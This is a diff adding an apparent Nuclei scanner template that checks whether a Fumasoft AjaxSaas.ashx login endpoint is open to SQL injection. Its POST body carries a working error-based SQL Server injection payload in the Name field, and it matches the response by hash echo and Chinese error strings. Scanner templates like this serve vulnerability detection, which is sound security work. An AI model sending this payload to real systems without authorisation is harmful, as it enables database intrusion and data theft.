@@ -1,0 +1,35 @@
+id: poc-fumasoft-ajaxsaas-ashx-sqli
+info:
+  name: Fumasoft AjaxSaas.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The Fumasoft AjaxSaas.ashx endpoint is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries.
+
+variables:
+  t1: '{{rand_int(100, 1000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Ajax/AjaxSaas.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=Login&Name=2'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+&pwd=1&validateCode=&checkValidateCode=0
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+        part: body
